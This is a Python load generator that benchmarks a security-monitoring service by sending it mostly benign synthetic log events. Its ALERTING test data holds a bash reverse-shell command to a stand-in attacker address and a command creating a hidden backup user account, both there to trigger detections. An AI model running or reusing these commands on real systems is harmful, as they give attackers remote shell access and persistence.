"""Concurrency load generator — no external dependencies.

Measures throughput and latency percentiles against a running Aegis-SOC.
Writes a JSON result file so the numbers in the report are reproducible.

    python scripts/loadtest.py --url http://127.0.0.1:8098 --seconds 20 --concurrency 20
"""
from __future__ import annotations

import argparse
import asyncio
import json
import random
import statistics
import time
from pathlib import Path

import httpx

BENIGN = [
    {"event_type": "process", "host": "web-01", "user": "deploy",
     "process": "bash", "cmdline": "/bin/bash -lc ls -la /srv/app", "src_ip": "10.0.4.21"},
    {"event_type": "process", "host": "web-01", "user": "ops",
     "process": "systemctl", "cmdline": "systemctl restart nginx", "src_ip": "10.0.4.22"},
    {"event_type": "auth", "host": "web-01", "user": "ubuntu", "status": "success",
     "message": "Accepted publickey", "src_ip": "10.0.4.30"},
    {"event_type": "process", "host": "web-01", "user": "www-data",
     "process": "tail", "cmdline": "tail -n 200 /var/log/nginx/access.log", "src_ip": "10.0.4.21"},
]
# one in five requests is a detection (exercises rules + fusion + triage)
ALERTING = [
    {"event_type": "process", "host": "web-01", "user": "root", "process": "bash",
     "cmdline": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", "src_ip": "203.0.113.9"},
    {"event_type": "process", "host": "web-01", "user": "root", "process": "useradd",
     "cmdline": "/usr/sbin/useradd -m -s /bin/bash svcbackup", "src_ip": "203.0.113.9"},
]


async def one(cli: httpx.AsyncClient, url: str, mode: str) -> tuple[float, bool]:
    t0 = time.perf_counter()
    try:
        if mode == "health":
            r = await cli.get(f"{url}/api/health")
        elif mode == "read":
            r = await cli.get(f"{url}/api/alerts?limit=50")
        else:
            ev = ALERTING[0] if random.random() < 0.2 else random.choice(BENIGN)
            r = await cli.post(f"{url}/ingest", json=ev)
        return time.perf_counter() - t0, r.status_code < 500
    except Exception:
        return time.perf_counter() - t0, False


async def worker(cli, url, mode, deadline, lat, ok):
    while time.perf_counter() < deadline:
        dt, good = await one(cli, url, mode)
        lat.append(dt)
        ok.append(good)


async def run(url: str, seconds: int, concurrency: int, mode: str) -> dict:
    limits = httpx.Limits(max_connections=concurrency * 2, max_keepalive_connections=concurrency)
    lat: list[float] = []
    ok: list[bool] = []
    async with httpx.AsyncClient(timeout=30, limits=limits) as cli:
        start = time.perf_counter()
        deadline = start + seconds
        await asyncio.gather(*[worker(cli, url, mode, deadline, lat, ok)
                               for _ in range(concurrency)])
        elapsed = time.perf_counter() - start

    lat.sort()
    n = len(lat)

    def pct(p: float) -> float:
        if not n:
            return 0.0
        return round(lat[min(n - 1, int(p / 100 * n))] * 1000, 1)

    return {
        "mode": mode, "seconds": round(elapsed, 1), "concurrency": concurrency,
        "requests": n, "rps": round(n / elapsed, 1),
        "error_rate": round(1 - (sum(ok) / n), 4) if n else 1.0,
        "p50_ms": pct(50), "p95_ms": pct(95), "p99_ms": pct(99),
        "mean_ms": round(statistics.mean(lat) * 1000, 1) if n else 0.0,
        "max_ms": round(max(lat) * 1000, 1) if n else 0.0,
    }


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://127.0.0.1:8098")
    ap.add_argument("--seconds", type=int, default=20)
    ap.add_argument("--concurrency", type=int, default=20)
    ap.add_argument("--mode", default="ingest", choices=["ingest", "health", "read", "all"])
    ap.add_argument("--out", default="evals/resource/loadtest.json")
    a = ap.parse_args()

    modes = ["health", "read", "ingest"] if a.mode == "all" else [a.mode]
    results = [asyncio.run(run(a.url, a.seconds, a.concurrency, m)) for m in modes]

    for r in results:
        print(f"{r['mode']:<7} {r['rps']:>8} rps  p50 {r['p50_ms']:>7} ms  "
              f"p95 {r['p95_ms']:>7} ms  p99 {r['p99_ms']:>7} ms  "
              f"errors {r['error_rate']*100:.1f}%  ({r['requests']} req)")

    Path(a.out).parent.mkdir(parents=True, exist_ok=True)
    Path(a.out).write_text(json.dumps({"url": a.url, "concurrency": a.concurrency,
                                       "seconds": a.seconds, "results": results}, indent=2))
    print(f"\nwrote {a.out}")


if __name__ == "__main__":
    main()
